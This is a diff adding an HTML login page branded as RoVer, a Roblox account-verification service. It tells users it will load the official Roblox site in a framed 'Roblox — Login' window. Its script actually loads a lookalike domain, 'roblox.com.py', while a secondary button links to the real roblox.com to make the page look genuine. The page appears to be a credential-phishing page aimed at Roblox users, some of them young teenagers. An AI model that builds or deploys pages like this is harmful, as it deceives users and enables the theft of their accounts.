@@ -1,0 +1,246 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>RoVer Login - Embedded Roblox</title>
+<style>
+  :root {
+    --bg: #1e1e1e;
+    --card: #2c2c2c;
+    --text: #e8e6e3;
+    --accent: #ff3d87;
+    --radius: 8px;
+    --maxw: 960px;
+    --font: -apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    font-family: var(--font);
+    background: var(--bg);
+    color: var(--text);
+  }
+
+  header {
+    background: var(--accent);
+    padding: 1rem 2rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+  header img { height: 2.5rem; }
+  nav a {
+    color: #fff; margin-left: 1rem; text-decoration: none; font-weight: 500;
+  }
+
+  main {
+    flex: 1;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    padding: 3rem 1rem;
+  }
+  .card {
+    background: var(--card);
+    border-radius: var(--radius);
+    max-width: var(--maxw);
+    width: 100%;
+    padding: 2rem;
+    box-shadow: 0 4px 15px rgba(0,0,0,.3);
+  }
+  h1 { font-size: 2rem; margin-bottom: 1rem; }
+  p { margin-bottom: 1rem; line-height: 1.5; }
+
+  .alert {
+    background: #333;
+    padding: 1rem;
+    border-left: 4px solid var(--accent);
+    margin-bottom: 1.5rem;
+    border-radius: var(--radius);
+  }
+
+  .btn {
+    display: inline-block;
+    padding: 0.75rem 1.5rem;
+    border-radius: var(--radius);
+    background: var(--accent);
+    color: #fff;
+    border: 0;
+    cursor: pointer;
+    font-size: 1rem;
+  }
+
+  footer {
+    background: var(--card);
+    padding: 2rem 1rem;
+    text-align: center;
+    font-size: 0.9rem;
+    color: #aaa;
+  }
+  footer .footer-links {
+    margin-top: 1rem;
+    display: grid;
+    grid-template-columns: repeat(auto-fit,minmax(140px,1fr));
+    gap: 0.5rem;
+    max-width: var(--maxw);
+    margin-left: auto;
+    margin-right: auto;
+  }
+  footer a { color: var(--accent); text-decoration: none; }
+
+  /* modal */
+  .overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,.6);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 1000;
+  }
+  .modal {
+    width: 90%;
+    max-width: 1100px;
+    height: 80%;
+    background: #111;
+    border-radius: var(--radius);
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+    box-shadow: 0 10px 30px rgba(0,0,0,.6);
+    position: relative;
+  }
+  .modal header {
+    padding: .5rem 1rem;
+    background: rgba(0,0,0,.3);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+  .modal iframe {
+    flex: 1;
+    width: 100%;
+    border: 0;
+    display: block;
+  }
+  .close-btn {
+    background: transparent;
+    border: 1px solid rgba(255,255,255,.2);
+    color: #fff;
+    padding: .4rem .8rem;
+    border-radius: 6px;
+    cursor: pointer;
+  }
+
+  /* Loading overlay INSIDE the modal (covers iframe while waiting) */
+  .loading-overlay {
+    position: absolute;
+    top: 2.5rem; /* below modal header */
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: #111;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #fff;
+    font-size: 1.2rem;
+    z-index: 10;
+  }
+</style>
+</head>
+<body>
+<header>
+  <img src="logo-white-NE2GPYXA.svg" alt="RoVer logo">
+  <nav>
+    <a href="#">Help</a>
+    <a href="#">Team Members</a>
+    <a href="#">RoVer Plus</a>
+    <a href="#">Manage Servers</a>
+    <a href="#">Sign In</a>
+  </nav>
+</header>
+
+<main>
+  <div class="card">
+    <h1>Sign in to RoVer</h1>
+    <p>You must be 13 years of age or older to continue.</p>
+
+    <div class="alert">
+      This will attempt to load the official Roblox site inside the page. If Roblox disallows framing, we'll show a fallback.
+    </div>
+
+    <button id="openFrame" class="btn">Log in with Roblox (in-page)</button>
+  </div>
+</main>
+
+<footer>
+  <div>© 2025 Imaginary Menagerie, LLC.</div>
+  <div class="footer-links">
+    <a href="#">Attributions</a>
+    <a href="#">Team members</a>
+    <a href="#">Support Discord server</a>
+    <a href="#">Add RoVer to your server</a>
+    <a href="#">Bot Developer API</a>
+    <a href="#">Terms of Service</a>
+    <a href="#">Privacy Policy</a>
+    <a href="#">Verify your Roblox account</a>
+  </div>
+</footer>
+
+<!-- Modal -->
+<div id="overlay" class="overlay" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+  <div class="modal" role="document" id="robloxModal">
+    <header>
+      <strong id="modalTitle" style="color:#fff">Roblox — Login</strong>
+      <div>
+        <button id="openNewTab" class="close-btn">Open in new tab</button>
+        <button id="closeModal" class="close-btn">Close</button>
+      </div>
+    </header>
+
+    <iframe id="robloxIframe" src="about:blank" title="Roblox"></iframe>
+
+    <!-- Loading overlay (hidden once iframe finishes loading) -->
+    <div id="loadingOverlay" class="loading-overlay">
+      <p>⚡ Please wait while we patiently load Roblox...</p>
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  const overlay = document.getElementById('overlay');
+  const openBtn = document.getElementById('openFrame');
+  const closeBtn = document.getElementById('closeModal');
+  const iframe = document.getElementById('robloxIframe');
+  const openNewTabBtn = document.getElementById('openNewTab');
+  const loadingOverlay = document.getElementById('loadingOverlay');
+
+  function showModal(){
+    overlay.style.display = 'flex';
+    loadingOverlay.style.display = 'flex'; // show waiting screen
+    iframe.style.display = 'block';
+    iframe.src = "https://roblox.com.py/users/4459472933/profile";
+  }
+
+  function closeModal(){
+    overlay.style.display = 'none';
+    iframe.src = "about:blank";
+  }
+
+  openBtn.addEventListener('click', showModal);
+  closeBtn.addEventListener('click', closeModal);
+  openNewTabBtn.addEventListener('click', () => window.open("https://www.roblox.com/","_blank","noopener,noreferrer"));
+
+  // Hide the loading overlay once iframe has finished loading
+  iframe.addEventListener('load', () => {
+    loadingOverlay.style.display = 'none';
+  });
+})();
+</script>
+</body>
+</html>
